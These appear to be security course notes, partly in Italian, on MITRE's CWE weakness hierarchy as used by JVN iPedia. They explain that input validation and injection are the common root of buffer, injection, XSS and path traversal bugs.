- **CWE-19 Data Handling** → CWE-189 Numeric Errors, CWE-199 Information Management Errors, **CWE-20 Insufficient Input Validation** → CWE-21 Pathname Traversal and Equivalence Errors (→ CWE-22 Path Traversal, CWE-59 Link Following), **CWE-119 Buffer Errors**, **CWE-74 Injection** (→ CWE-134 Uncontrolled Format String, CWE-77 Command Injection → CWE-78 OS Command Injection, CWE-79 XSS, CWE-89 SQL Injection, CWE-94 Code Injection); CWE-200 Information Leak.
- **CWE-254 Security Features** → CWE-255 Credentials Management, CWE-284 Permissions/Privileges/Access Controls, CWE-310 Cryptographic Issues, CWE-287 Insufficient Authentication, CWE-345 Insufficient Verification of Data Authenticity (→ CWE-352 CSRF).
- **CWE-361 Time and State** → CWE-362 Race Condition; **CWE-398 Indicator of Poor Code Quality** → CWE-399 Resource Management Errors; **CWE-657 Violation of Secure Design Principles**; CWE-503 Byte/Object Code.

**Approfondimento.** È la gerarchia **CWE** (Common Weakness Enumeration) di MITRE come la usa il database giapponese di vulnerabilità JVN iPedia. È un catalogo formale, ad albero, di *tipi di debolezza* (diverso dalle CVE, che danno un nome alle singole vulnerabilità; Lezione 1, slide 37). Il punto della slide per questa lezione: **CWE-20 "Insufficient Input Validation" e CWE-74 "Injection" sono nodi grandi e centrali** i cui discendenti comprendono quasi tutte le vulnerabilità studiate finora: errori di buffer (CWE-119), format string (CWE-134), command injection (CWE-77/78), SQL injection (CWE-89), XSS (CWE-79), code injection (CWE-94), path traversal (CWE-22). La tassonomia rende visibile che non sono bug scollegati ma fratelli sotto un'unica causa di fondo: un input non fidato che non viene validato o separato dal codice come si deve. Conoscere l'id CWE di un bug permette di consultarne la descrizione standard, gli esempi e le mitigazioni, e collega una vulnerabilità trovata allo schema generale di cui è un'istanza.
